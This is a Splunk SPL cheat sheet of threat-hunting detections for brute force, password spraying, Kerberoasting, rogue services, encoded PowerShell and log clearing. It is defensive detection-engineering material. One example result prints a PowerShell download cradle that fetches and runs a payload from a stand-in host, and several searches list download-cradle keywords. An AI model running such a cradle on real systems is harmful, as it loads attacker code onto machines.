# Splunk SPL Threat Hunting & Attack Detection Cheat Sheet

---


## 📊 Data-Source Matrix

| Detection Category | Primary Log Source | Common Sourcetype | Key SPL Fields Required |
| --- | --- | --- | --- |
| **Authentication** | Windows Security / Linux Auth / Azure AD | `WinEventLog:Security`, `linux_secure`, `azure:aad:signin` | `user`, `src_ip`, `action`, `EventCode`, `status` |
| **Windows & AD** | Windows Security Event Logs | `WinEventLog:Security` | `EventCode`, `TargetUserName`, `SubjectUserName`, `GroupName` |
| **Process Execution** | Microsoft Sysmon / Windows Event 4688 | `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational` | `EventCode`, `Image`, `CommandLine`, `ParentImage`, `User` |
| **PowerShell** | PowerShell Script Block Logging | `WinEventLog:Microsoft-Windows-PowerShell/Operational` | `EventCode`, `ScriptBlockText`, `Path`, `User` |
| **Network Traffic** | Firewall / Zeek / Palo Alto / Sysmon Net | `pan:traffic`, `zeek:conn`, `XmlWinEventLog:.../Sysmon` | `src_ip`, `dest_ip`, `dest_port`, `bytes_out`, `bytes_in` |
| **DNS Activity** | Windows DNS Server / Zeek DNS / Splunk Stream | `WinDNS`, `zeek:dns`, `stream:dns` | `query`, `query_length`, `src_ip`, `record_type` |
| **Web Server** | Apache / Nginx / IIS Logs / WAF | `access_combined`, `iis`, `aws:waf` | `src_ip`, `uri_path`, `status`, `http_user_agent`, `method` |
| **Linux Security** | Linux Auditd / Syslog | `linux_secure`, `auditd` | `user`, `process`, `command`, `src_ip`, `app` |
| **Cloud (AWS)** | AWS CloudTrail Logs | `aws:cloudtrail` | `eventName`, `eventSource`, `userIdentity.arn`, `sourceIPAddress` |

---

## 🧩 SPL Fundamentals Used in This Cheat Sheet


* **Search Terms & Boolean Operators (`AND`, `OR`, `NOT`)**
* *Purpose:* Narrows down raw events matching specific string patterns.
* *Syntax:* `index=security ("failed" OR "failure") NOT user="system"`
* *Security Use Case:* Filtering out system noise to focus on real user authentication events.



* **`stats`**
* *Purpose:* Aggregates events and calculates summary metrics (counts, distinct counts, averages) grouped by fields.
* *Syntax:* `... | stats count, dc(dest_ip) as target_count by src_ip`
* *Security Use Case:* Counting failed logins per IP to detect brute-force attacks.



* **`eventstats`**
* *Purpose:* Calculates aggregate statistics across the dataset and appends the result as a new field to every individual event without discarding raw rows.
* *Syntax:* `... | eventstats avg(bytes_out) as avg_bytes by src_ip`
* *Security Use Case:* Comparing an individual connection's size against that IP's average outbound volume.



* **`streamstats`**
* *Purpose:* Calculates running statistics in real-time as events pass through the pipeline in chronological order.
* *Syntax:* `... | streamstats current=f last(_time) as prev_time by src_ip`
* *Security Use Case:* Measuring exact time gaps between sequential HTTP requests to detect C2 beaconing.



* **`eval`**
* *Purpose:* Creates new fields, performs mathematical operations, or transforms string values based on logic (`if`, `case`, `coalesce`).
* *Syntax:* `... | eval MB = bytes / 1024 / 1024`
* *Security Use Case:* Converting raw byte values into megabytes or unifying mismatched field names across log sources.



* **`where`**
* *Purpose:* Filters search results using boolean expressions, mathematical comparisons, or string operations. Case-sensitive.
* *Syntax:* `... | where failed_attempts >= 10`
* *Security Use Case:* Dropping aggregate statistics rows that do not breach designated risk thresholds.



* **`table` & `fields**`
* *Purpose:* `table` formats output into dedicated visible columns; `fields` keeps or removes specific fields in memory to speed up search performance.
* *Syntax:* `... | table _time, user, src_ip, action`
* *Security Use Case:* Building readable, structured summary reports for SOC operational tickets.



* **`rename`**
* *Purpose:* Changes internal field names to user-friendly titles or standard Common Information Model (CIM) aliases.
* *Syntax:* `... | rename TargetUserName as user, IpAddress as src_ip`
* *Security Use Case:* Standardizing vendor-specific fields across multi-cloud and Windows logs.



* **`sort`**
* *Purpose:* Orders search results by specified numerical or string fields (ascending by default, descending with `-`).
* *Syntax:* `... | sort - total_bytes`
* *Security Use Case:* Displaying top compromised accounts or highest data exfiltration targets first.



* **`dedup`**
* *Purpose:* Removes duplicate events that share identical values for specified fields.
* *Syntax:* `... | dedup user, src_ip`
* *Security Use Case:* Consolidating repeated alerts into a list of unique indicators of compromise (IOCs).



* **`rex`**
* *Purpose:* Extracts custom fields from unformatted raw log text (`_raw`) using Regular Expressions (Regex).
* *Syntax:* `... | rex field=_raw "from (?<src_ip>\d+\.\d+\.\d+\.\d+)"`
* *Security Use Case:* Pulling out injected SQL commands or domain names from unparsed application logs.



* **`bin` / `bucket**`
* *Purpose:* Groups continuous numerical values or time stamps into discrete intervals.
* *Syntax:* `... | bin _time span=15m`
* *Security Use Case:* Dividing network traffic into 15-minute buckets for time-series trend analysis.



* **`timechart`**
* *Purpose:* Creates statistical aggregation tables pre-formatted for time-series charts and line graphs.
* *Syntax:* `... | timechart span=1h count by sourcetype`
* *Security Use Case:* Visualizing sudden spikes in network connection attempts over 24 hours.



* **`transaction`**
* *Purpose:* Collapses related events into a single multi-event transaction based on matching fields and time limits.
* *Syntax:* `... | transaction user maxspan=30m maxpause=5m`
* *Security Use Case:* Stitching together an entire user session from initial login to command execution and logout.



* **`lookup`**
* *Purpose:* Enriches search results with context from an external CSV file or KV-store table.
* *Syntax:* `... | lookup threat_intel_ips ip as src_ip OUTPUT threat_category`
* *Security Use Case:* Matching internal source IPs against known malicious threat intelligence feeds.



---

## ⏳ Time-Range Best Practices

| Search Type | Recommended Time Range | SPL Time Modifier | Rationale |
| --- | --- | --- | --- |
| **Real-Time Alert Rule** | 5 to 15 Minutes | `earliest=-15m latest=now` | Minimizes cluster resource overhead while surfacing near-real-time threats. |
| **Hourly Summary Rule** | 1 Hour | `earliest=-60m@m latest=@m` | Standard window for aggregating baseline behaviors like HTTP requests or DNS queries. |
| **Daily Threat Hunt** | 24 Hours | `earliest=-24h latest=now` | Catches slow-and-low attacks, password spraying, or off-hours anomalies. |
| **Historical Baseline / Audit** | 7 to 30 Days | `earliest=-30d@d latest=@d` | Establishes behavioral baselines to identify rare executable runs or new user domains. |

---

## ⚙️ Detection Engineering Framework

```text
  Raw Security Telemetry
            │
            ▼
   [ SPL Logic Search ] ──► (Filter events using indexes, EventCodes, and log patterns)
            │
            ▼
  [ Data Aggregation ] ──► (Group by user/src/dest using stats or streamstats)
            │
            ▼
  [ Threshold Analytics ] ─► (Apply mathematical & operational bounds via where)
            │
            ▼
  [ False Positive Tuning ] ► (Exclude authorized service accounts, scanners, and jump boxes)
            │
            ▼
  [ Alert Generation ] ───► (Trigger Splunk Alert / Enterprise Security Notable Event)
            │
            ▼
[ Investigation Playbook ] ─► (SOC Analysts validate, isolate endpoint, and contain threat)

```

---

## 🛡️ False Positive & Tuning Guide

* **Vulnerability Scanners (Qualys, Nessus, Tenable):** Generate thousands of fake web attacks and connection probes. *Tuning:* Maintain an IP lookup table `scanner_ips.csv` and add `NOT [| inputlookup scanner_ips.csv]` to alert rules.
* **Service & Administrative Accounts:** Automated backup scripts or administrative tools trip login failure alerts during password rotation windows. *Tuning:* Exclude known service account naming conventions (`NOT TargetUserName="svc_*" NOT TargetUserName="*$"`).
* **Software Deployment Tools (SCCM, PDQ Deploy, Ansible):** Deploy scripts remotely, triggering false process execution alerts. *Tuning:* Filter by verified administrative parent processes and restricted management network segments.
* **Backup Systems (Veeam, Commvault):** Transfer large blocks of data overnight, setting off exfiltration rules. *Tuning:* Limit network exfiltration searches to standard business operating hours or exclude dedicated backup subnets.

---

## 🚦 Severity Classification Matrix

| Severity Level | Color | Response SLA | Criteria / Impact |
| --- | --- | --- | --- |
| **Critical** | 🚨 Red | `< 15 Mins` | Immediate active compromise (e.g., Ransomware deployment, Domain Admin compromise, active C2 connection). |
| **High** | 🟠 Orange | `< 1 Hour` | Confirmed malicious activity with risk of lateral movement (e.g., LSASS memory dumping, Kerberoasting, unauthorized administrative addition). |
| **Medium** | 🟡 Yellow | `< 4 Hours` | Suspicious activity requiring analyst validation (e.g., Password spraying threshold met, encoded PowerShell execution, event log clearing). |
| **Low / Info** | 🟢 Green | `< 24 Hours` | Policy violation or slight anomaly (e.g., Off-hours successful login, single failed SSH login attempt). |

---

## 🔍  Investigation Playbook Workflow

```text
  [ Alert Triggered ]
            │
            ▼
1. Validate Alert Accuracy
   └── Verify query fired correctly; rule out routine maintenance and vulnerability scanners.
            │
            ▼
2. Scope Affected Assets & Identities
   └── Identify target host (dest), source device (src_ip), and impacted account (user).
            │
            ▼
3. Construct Event Timeline
   └── Search 30 minutes before and after the alert trigger window for surrounding context.
            │
            ▼
4. Correlate Across Data Sources
   └── Match endpoint process logs (Sysmon) with network connections, proxy logs, and AD auth.
            │
            ▼
5. Assess Threat Level & Impact
   └── Confirm whether malicious execution succeeded or was successfully blocked by host defenses.
            │
            ▼
6. Contain, Eradicate & Document
   └── Isolate host, revoke compromised tokens, block malicious remote IPs, update SOC ticket.

```

---

## 🤖 BOTS v3 Compatibility & Discovery Guide

If analyzing the **Splunk Boss of the SOC v3 (BOTS v3)** dataset, note that events use historical timestamps (primarily 2018–2019) and sit under dedicated index structures.

### Safe Discovery Searches

#### 1. Discover Available Indexes

```spl
| tstats count where index=* by index

```

#### 2. Discover Sourcetypes in the BOTS v3 Index

```spl
| tstats count where index=botsv3 by sourcetype

```

#### 3. Inspect Raw Events & Field Schemas

```spl
index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
| head 10

```

#### 4. Analyze Field Summaries for Specific Sourcetypes

```spl
index=botsv3 sourcetype="WinEventLog:Security" 
| fieldsummary 
| table field, count, distinct_count, values

```

---

## 🎯 Detections

### 🔐 Authentication & Credential Attacks

#### 1. Account Brute-Force Detection

##### 🎯 What It Detects

High volumes of failed login attempts targeting a single user account from one source IP address within a short time window.

##### 🧠 Attack Concept

Attackers use automated tools to guess valid passwords by targeting authentication endpoints.

* **MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

##### 📥 Required Log Source

* **Log Source:** Windows Security Logs / Linux Secure Logs / SSO Logs
* **Example Sourcetype:** `WinEventLog:Security`, `linux_secure`, `azure:aad:signin`
* **Key Fields:** `user`, `src_ip`, `action`, `EventCode`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (sourcetype="WinEventLog:Security" EventCode=4625) OR (sourcetype="linux_secure" "Failed password")
| eval target_user = coalesce(user, TargetUserName)
| eval source_ip = coalesce(src_ip, IpAddress)
| stats count as failed_attempts, min(_time) as first_seen, max(_time) as last_seen by target_user, source_ip
| where failed_attempts >= 10
| eval duration_sec = last_seen - first_seen
| sort - failed_attempts

```

##### 🔍 SPL Command Breakdown

* `index=YOUR_INDEX ...`: Filters authentication failure events across Windows and Linux logs.
* `eval target_user = coalesce(...)`: Unifies mismatched field names for user accounts into `target_user`.
* `eval source_ip = coalesce(...)`: Unifies mismatched field names for IP addresses into `source_ip`.
* `stats count ... by target_user, source_ip`: Aggregates failure counts per unique user and IP combination.
* `where failed_attempts >= 10`: Filters out routine user typos, retaining only high-volume failure bursts.

##### 📊 Example Result

| target_user | source_ip | failed_attempts | duration_sec |
| --- | --- | --- | --- |
| Administrator | 192.168.1.150 | 87 | 14 |
| jsmith | 10.0.4.12 | 12 | 120 |

##### 🚨 Why This Is Suspicious

Rapid consecutive authentication failures indicate automated credential guessing tools in operation.

##### ⚙️ SOC Tuning

Adjust `failed_attempts >= 10` threshold upward in enterprise environments with high traffic baselines.

##### 🕵️ Investigation Tips

1. Check if a successful login occurred from `source_ip` immediately after the failures.
2. Check geo-location details for `source_ip`.
3. Verify if `target_user` is a domain administrative account.

##### 🛡️ Recommended Response

* Lock the targeted account if lockout policies have not auto-triggered.
* Block the offending source IP at the perimeter firewall or SSO Gateway.

---

#### 2. Password Spraying Attack

##### 🎯 What It Detects

A single source IP attempting to log into many unique user accounts using a low number of attempts per account.

##### 🧠 Attack Concept

Evades account lockouts by testing a few common passwords (e.g., `Autumn2026!`) across hundreds of accounts.

* **MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying

##### 📥 Required Log Source

* **Log Source:** Active Directory / Azure AD Sign-in Logs / Okta
* **Example Sourcetype:** `azure:aad:signin`, `WinEventLog:Security`
* **Key Fields:** `user`, `src_ip`, `status`, `EventCode`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (EventCode=4625 OR sourcetype="azure:aad:signin")
| eval target_user = coalesce(user, TargetUserName, userPrincipalName)
| eval source_ip = coalesce(src_ip, IpAddress, clientIp)
| stats dc(target_user) as distinct_targets, count as total_failures by source_ip
| where distinct_targets >= 10 AND (total_failures / distinct_targets) <= 3
| sort - distinct_targets

```

##### 🔍 SPL Command Breakdown

* `stats dc(target_user) as distinct_targets ...`: Counts distinct targeted accounts (`dc`) per source IP.
* `where distinct_targets >= 10 AND ...`: Isolates IPs hitting at least 10 unique users with low failure ratios per user.

##### 📊 Example Result

| source_ip | distinct_targets | total_failures |
| --- | --- | --- |
| 185.220.101.5 | 142 | 150 |

##### 🚨 Why This Is Suspicious

Targeting dozens of distinct corporate accounts from a single external IP address indicates an active password spray operation.

##### ⚙️ SOC Tuning

Filter out corporate egress proxies, NAT gateways, and internal load balancers that group legitimate user traffic under a single IP.

##### 🕵️ Investigation Tips

1. Search for any successful login from `source_ip` during or shortly after the spray window.
2. Verify if targeted accounts share identical organizational departments or password policies.

##### 🛡️ Recommended Response

* Enforce password resets for targeted accounts that recorded subsequent successful logins.
* Block `source_ip` on external authentication endpoints.

---

#### 3. Multiple Failed Logins Followed by Success

##### 🎯 What It Detects

A sequence of failed authentication attempts for a user account followed immediately by a successful logon from the same IP.

##### 🧠 Attack Concept

Indicates a successful brute-force or password-guessing attempt where the adversary successfully determined the valid password.

* **MITRE ATT&CK:** T1110 — Brute Force

##### 📥 Required Log Source

* **Log Source:** Windows Security Logs / Linux Logs / VPN Logs
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `TargetUserName`, `IpAddress`, `EventCode` (4625 = Fail, 4624 = Success)

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" (EventCode=4625 OR EventCode=4624)
| eval action = if(EventCode=4624, "Success", "Failure")
| stats count(eval(action="Failure")) as fails, count(eval(action="Success")) as successes by TargetUserName, IpAddress
| where fails >= 5 AND successes >= 1
| table TargetUserName, IpAddress, fails, successes

```

##### 🔍 SPL Command Breakdown

* `eval action = if(...)`: Maps EventCode 4624 to "Success" and 4625 to "Failure".
* `stats count(eval(action="Failure")) ...`: Calculates independent failure and success counts for each user and IP pair.
* `where fails >= 5 AND successes >= 1`: Filters for successful logons preceded by 5 or more failures.

##### 📊 Example Result

| TargetUserName | IpAddress | fails | successes |
| --- | --- | --- | --- |
| msmith | 203.0.113.45 | 18 | 1 |

##### 🚨 Why This Is Suspicious

A sudden success after multiple failure attempts strongly indicates a cracked password.

##### ⚙️ SOC Tuning

Adjust failure threshold to filter out routine user password change syncing errors on mobile devices.

##### 🕵️ Investigation Tips

1. Review post-logon actions executed by `TargetUserName` immediately following the successful logon.
2. Confirm if Multi-Factor Authentication (MFA) was triggered and passed.

##### 🛡️ Recommended Response

* Terminate active user sessions immediately.
* Force a password reset and re-verify MFA registration.

---

#### 4. Suspicious Successful Login From New Source IP

##### 🎯 What It Detects

A successful login originating from an IP address that has not been associated with that user account over the preceding 30 days.

##### 🧠 Attack Concept

Identifies unauthorized access using valid compromised credentials from novel adversary infrastructure.

* **MITRE ATT&CK:** T1078 — Valid Accounts

##### 📥 Required Log Source

* **Log Source:** Azure AD / Okta / VPN Logs / Windows Security
* **Example Sourcetype:** `azure:aad:signin`, `WinEventLog:Security`
* **Key Fields:** `user`, `src_ip`, `action`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX action="success"
| eval user = lower(user), src_ip = coalesce(src_ip, IpAddress)
| stats min(_time) as first_seen, max(_time) as last_seen by user, src_ip
| eventstats min(first_seen) as user_first_seen by user
| where first_seen > relative_time(now(), "-1d") AND user_first_seen < relative_time(now(), "-7d")
| table user, src_ip, first_seen

```

##### 🔍 SPL Command Breakdown

* `eventstats min(first_seen) as user_first_seen by user`: Establishes the user's historical presence baseline.
* `where first_seen > relative_time(...)`: Isolates new IP connections occurring in the last 24 hours for established accounts.

##### 📊 Example Result

| user | src_ip | first_seen |
| --- | --- | --- |
| bwayne | 198.51.100.77 | 2026-08-31 14:22:01 |

##### 🚨 Why This Is Suspicious

First-time access to user accounts from unfamiliar remote locations often signals compromised account usage.

##### ⚙️ SOC Tuning

Whitelist standard VPN IP address ranges and primary corporate office locations.

##### 🕵️ Investigation Tips

1. Check IP geo-location and ISP background data.
2. Contact user directly via out-of-band communication to verify logon legitimacy.

##### 🛡️ Recommended Response

* Challenge user with mandatory MFA step-up re-authentication.
* Revoke active session tokens if unconfirmed.

---

#### 5. Impossible Travel / Velocity Anomaly

##### 🎯 What It Detects

Sequential successful logons for a user account from two geographically distant locations within a time frame faster than physical travel allows.

##### 🧠 Attack Concept

Detects credential sharing, proxy usage, or stolen session token replay across adversary networks.

* **MITRE ATT&CK:** T1078 — Valid Accounts

##### 📥 Required Log Source

* **Log Source:** Cloud Identity Provider (Azure AD / Okta)
* **Example Sourcetype:** `azure:aad:signin`
* **Key Fields:** `userPrincipalName`, `clientIp`, `location`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="azure:aad:signin" status.errorCode=0
| sort 0 userPrincipalName, _time
| streamstats current=f last(_time) as prev_time, last(location) as prev_loc, last(clientIp) as prev_ip by userPrincipalName
| eval time_diff_hrs = (_time - prev_time) / 3600
| where location != prev_loc AND time_diff_hrs < 2 AND time_diff_hrs > 0
| table _time, userPrincipalName, prev_loc, location, prev_ip, clientIp, time_diff_hrs

```

##### 🔍 SPL Command Breakdown

* `streamstats current=f last(...) by userPrincipalName`: Pulls the location, IP, and timestamp of the user's *prior* logon event.
* `eval time_diff_hrs = ...`: Converts the elapsed time between logons into decimal hours.
* `where location != prev_loc AND time_diff_hrs < 2`: Flags distinct location logins occurring under 2 hours apart.

##### 📊 Example Result

| userPrincipalName | prev_loc | location | prev_ip | clientIp | time_diff_hrs |
| --- | --- | --- | --- | --- | --- |
| alice@company.com | US-NY | FR-PAR | 1.2.3.4 | 5.6.7.8 | 0.45 |

##### 🚨 Why This Is Suspicious

A single user cannot physically travel across international locations in under an hour.

##### ⚙️ SOC Tuning

Filter out corporate VPN gateways that assign users different exit nodes rapidly.

##### 🕵️ Investigation Tips

1. Check if either source IP matches public cloud infrastructure (AWS, Azure) or known VPN ranges.
2. Compare device hostnames and user-agent strings between logons.

##### 🛡️ Recommended Response

* Revoke all active session tokens and reset account credentials.

---

#### 6. Kerberoasting Attack Detection

##### 🎯 What It Detects

Requests for Active Directory Kerberos service tickets (TGS) requesting weak legacy encryption (RC4 / `0x17`).

##### 🧠 Attack Concept

Adversaries request TGS tickets for Service Principal Names (SPNs) to extract ticket hashes and crack service account passwords offline.

* **MITRE ATT&CK:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

##### 📥 Required Log Source

* **Log Source:** Active Directory Domain Controller Event Logs
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `EventCode` (4769), `TicketOptions`, `TicketEncryptionType`, `ServiceName`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" EventCode=4769 TicketEncryptionType=0x17 ServiceName!="*$"
| stats count, values(ServiceName) as target_services by TargetUserName, IpAddress
| where count > 3

```

##### 🔍 SPL Command Breakdown

* `EventCode=4769`: Standard Windows Kerberos service ticket request log event.
* `TicketEncryptionType=0x17`: Identifies weak, easily crackable RC4-HMAC encryption requests.
* `ServiceName!="*$"`: Excludes routine computer account service requests.

##### 📊 Example Result

| TargetUserName | IpAddress | count | target_services |
| --- | --- | --- | --- |
| bad_actor | 10.0.1.50 | 12 | MSSQL/db1.domain.local, HTTP/web.domain.local |

##### 🚨 Why This Is Suspicious

Legitimate modern networks request AES encryption; high-volume RC4 service ticket requests point directly to Kerberoasting tools (e.g., Rubeus, Impacket).

##### ⚙️ SOC Tuning

Filter out legacy application service accounts explicitly documented as requiring RC4.

##### 🕵️ Investigation Tips

1. Review `target_services` to see if high-privilege service accounts (e.g., SQL service running as Domain Admin) were targeted.
2. Investigate process execution on `IpAddress` around the request timestamp.

##### 🛡️ Recommended Response

* Reset passwords for targeted service accounts to complex, random 25+ character passwords.
* Migrate domain Kerberos policies to enforce AES encryption exclusively.

---

### 🪟 Windows & Active Directory

#### 7. Windows Local Account Creation

##### 🎯 What It Detects

Creation of a new local user account on a Windows workstation or server.

##### 🧠 Attack Concept

Adversaries create local accounts to retain persistent access to endpoints independent of domain controller changes.

* **MITRE ATT&CK:** T1136.001 — Create Account: Local Account

##### 📥 Required Log Source

* **Log Source:** Windows Security Event Log
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `EventCode` (4720), `SubjectUserName`, `TargetUserName`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" EventCode=4720
| table _time, ComputerName, SubjectUserName, TargetUserName, SAMAccountName

```

##### 🔍 SPL Command Breakdown

* `EventCode=4720`: Windows security event triggered when a user account is created.
* `table ...`: Formats the creation event details into readable output columns.

##### 📊 Example Result

| _time | ComputerName | SubjectUserName | TargetUserName |
| --- | --- | --- | --- |
| 2026-08-31 10:11 | WORKSTATION01 | local_admin | backdoor_user |

##### 🚨 Why This Is Suspicious

Unscheduled local account creation on user endpoints is a common persistence mechanism.

##### ⚙️ SOC Tuning

Filter out automated IT deployment tools and endpoint provisioning software.

##### 🕵️ Investigation Tips

1. Identify `SubjectUserName` to verify who created the account.
2. Check if the newly created account was added to administrative groups.

##### 🛡️ Recommended Response

* Disable the newly created local account.
* Audit endpoint for unauthorized remote management tools.

---

#### 8. Account Added to Privileged Domain Group

##### 🎯 What It Detects

Addition of a user account to critical domain security groups (e.g., Domain Admins, Enterprise Admins, Administrators).

##### 🧠 Attack Concept

Adversaries elevate privileges by adding compromised accounts to administrative AD groups for persistent domain control.

* **MITRE ATT&CK:** T1098 — Account Manipulation

##### 📥 Required Log Source

* **Log Source:** Active Directory Security Event Logs
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `EventCode` (4728, 4732, 4756), `SubjectUserName`, `TargetUserName`, `GroupName`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Security" (EventCode=4728 OR EventCode=4732 OR EventCode=4756)
| search GroupName="*Admin*" OR GroupName="*Schema*" OR GroupName="*Account Operators*"
| table _time, ComputerName, EventCode, SubjectUserName, TargetUserName, GroupName

```

##### 🔍 SPL Command Breakdown

* `EventCode=4728 OR 4732 OR 4756`: Triggers when a user is added to global, local, or universal groups.
* `search GroupName="*Admin*"`: Filters specifically for privileged administrative groups.

##### 📊 Example Result

| _time | SubjectUserName | TargetUserName | GroupName |
| --- | --- | --- | --- |
| 2026-08-31 11:05 | compromised_user | attacker_acct | Domain Admins |

##### 🚨 Why This Is Suspicious

Unauthorized expansion of domain privileges grants full administrative control over domain infrastructure.

##### ⚙️ SOC Tuning

Cross-reference group additions against approved IT Change Management ticket requests.

##### 🕵️ Investigation Tips

1. Verify if an approved Change Ticket exists for this account modification.
2. Check recent authentication events and process executions performed by `SubjectUserName`.

##### 🛡️ Recommended Response

* Remove the user account from the privileged group immediately.
* Disable both the actor (`SubjectUserName`) and target (`TargetUserName`) accounts pending investigation.

---

#### 9. Suspicious Windows Service Creation

##### 🎯 What It Detects

Creation of a new Windows service executing binaries from non-standard or temporary directories.

##### 🧠 Attack Concept

Adversaries install services to run malicious binaries automatically at system boot with Elevated System privileges.

* **MITRE ATT&CK:** T1543.003 — Create or Modify System Process: Windows Service

##### 📥 Required Log Source

* **Log Source:** Windows System Event Log / Sysmon
* **Example Sourcetype:** `WinEventLog:System` (EventCode 7045) or Sysmon (EventCode 13)
* **Key Fields:** `EventCode`, `ServiceName`, `ImagePath`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:System" EventCode=7045
| search ImagePath="*AppData*" OR ImagePath="*Temp*" OR ImagePath="*cmd.exe*" OR ImagePath="*powershell.exe*" OR ImagePath="*vssadmin*"
| table _time, ComputerName, ServiceName, ImagePath, ServiceType

```

##### 🔍 SPL Command Breakdown

* `EventCode=7045`: Logs new service creation events on Windows hosts.
* `search ImagePath="*AppData*"...`: Flags services launching from non-standard user profile locations or invoking command shells directly.

##### 📊 Example Result

| ComputerName | ServiceName | ImagePath |
| --- | --- | --- |
| DB-SERVER01 | UpdaterSvc | C:\Users\Public\Temp\update.exe |

##### 🚨 Why This Is Suspicious

Legitimate Windows services run from `C:\Windows\System32\` or `C:\Program Files\`, not user temporary folders or command prompts.

##### ⚙️ SOC Tuning

Filter out verified administrative software deployments (e.g., custom backup agents or EDR software updates).

##### 🕵️ Investigation Tips

1. Retrieve the file binary located at `ImagePath` for static and dynamic analysis.
2. Identify the parent process and user context that initiated the service creation.

##### 🛡️ Recommended Response

* Stop and delete the unauthorized service via `sc.exe delete <ServiceName>`.
* Isolate the endpoint from the network to prevent potential lateral movement.

---

### ⚡ PowerShell & Process Execution

#### 10. Encoded PowerShell Execution

##### 🎯 What It Detects

PowerShell commands executed using encoded payload arguments (`-EncodedCommand`, `-enc`).

##### 🧠 Attack Concept

Attackers encode PowerShell commands in Base64 to bypass string-based command-line security monitoring.

* **MITRE ATT&CK:** T1059.001 — Command and Scripting Interpreter: PowerShell

##### 📥 Required Log Source

* **Log Source:** Sysmon Event Code 1 / Windows 4688 Process Creation
* **Example Sourcetype:** `XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`
* **Key Fields:** `EventCode` (1), `CommandLine`, `Image`, `ParentImage`, `User`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*powershell.exe"
| search CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*-e *"
| table _time, Computer, User, ParentImage, CommandLine

```

##### 🔍 SPL Command Breakdown

* `EventCode=1`: Sysmon Process Creation event.
* `CommandLine="*-enc*"`: Filters for flags commonly used to supply Base64 encoded code blocks to PowerShell.

##### 📊 Example Result

| Computer | User | ParentImage | CommandLine |
| --- | --- | --- | --- |
| WORKSTATION05 | SYSTEM | cmd.exe | powershell.exe -enc SQBFAFgA... |

##### 🚨 Why This Is Suspicious

While some legitimate administrative tools use encoding, obfuscated PowerShell is heavily leveraged by attack frameworks like Cobalt Strike and Metasploit.

##### ⚙️ SOC Tuning

Filter out known management tools (e.g., Microsoft Intune, SCCM scripts) that rely on encoded executions.

##### 🕵️ Investigation Tips

1. Extract the Base64 string from `CommandLine` and decode it to view the cleartext commands.
2. Check PowerShell Script Block logs (EventCode 4104) for full unencoded payload contents.

##### 🛡️ Recommended Response

* Terminate the rogue PowerShell process and isolate the host.

---

#### 11. Unmanaged PowerShell / Script Block Payload Execution

##### 🎯 What It Detects

Execution of suspicious API calls, download cradles, or obfuscated code captured by PowerShell Script Block Logging.

##### 🧠 Attack Concept

Captures the raw code executed inside PowerShell modules, bypassing command-line obfuscation tricks.

* **MITRE ATT&CK:** T1059.001 — PowerShell

##### 📥 Required Log Source

* **Log Source:** PowerShell Operational Log
* **Example Sourcetype:** `WinEventLog:Microsoft-Windows-PowerShell/Operational`
* **Key Fields:** `EventCode` (4104), `ScriptBlockText`, `Path`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX sourcetype="WinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
| search ScriptBlockText="*Net.WebClient*" OR ScriptBlockText="*DownloadString*" OR ScriptBlockText="*Invoke-Expression*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*Reflect*"
| table _time, ComputerName, User, ScriptBlockText

```

##### 🔍 SPL Command Breakdown

* `EventCode=4104`: Captures complete code blocks as they are executed by the PowerShell engine.
* `ScriptBlockText="*DownloadString*"`: Filters for common download cradles used to pull payloads from remote URLs into memory.

##### 📊 Example Result

| ComputerName | User | ScriptBlockText |
| --- | --- | --- |
| HR-DESK02 | jdoe | IEX (New-Object Net.WebClient).DownloadString('[http://bad.site/payload.ps1](https://www.google.com/search?q=http://bad.site/payload.ps1)') |

##### 🚨 Why This Is Suspicious

In-memory download cradles (`DownloadString`) allow attackers to load malicious payloads directly into RAM without writing files to disk.

##### ⚙️ SOC Tuning

Exclude signed administrative modules used by local IT teams.

##### 🕵️ Investigation Tips

1. Analyze the destination URL pulled by the download cradle.
2. Search web proxy logs for outgoing connections matching the script execution timestamp.

##### 🛡️ Recommended Response

* Block the payload distribution URL at the proxy/DNS level.
* Isolate host for memory analysis.

---

### 🦠 Malware & Endpoint Behavior

#### 12. Security Event Log Cleared

##### 🎯 What It Detects

Clearing of Windows Security Event Logs.

##### 🧠 Attack Concept

Adversaries erase event logs to cover their tracks and destroy forensic evidence of their compromise.

* **MITRE ATT&CK:** T1070.001 — Indicator Removal: Clear Windows Event Logs

##### 📥 Required Log Source

* **Log Source:** Windows Security Log / System Log
* **Example Sourcetype:** `WinEventLog:Security`
* **Key Fields:** `EventCode` (1102 in Security log, 104 in System log), `SubjectUserName`

##### 🔎 SPL Detection

```spl
index=YOUR_INDEX (EventCode=1102 OR EventCode=104)
| table _time, ComputerName, EventCode, SubjectUserName, SubjectUserSid

```

##### 🔍 SPL Command Breakdown

* `EventCode=1102`: Fires when the Windows Security Audit log is cleared.
* `EventCode=104`: Fires when the Windows System log is cleared.

##### 📊 Example Result

| _time | ComputerName | EventCode | SubjectUserName |
| --- | --- | --- | --- |
| 2026-08-31 16:40 | FILE-SERVER | 1102 | Administrator |

##### 🚨 Why This Is Suspicious

Legitimate administrative workflows rarely clear entire security logs manually outside of scheduled maintenance.

##### ⚙️ SOC Tuning

Filter out system provisioning scripts executed during routine server re-imaging.

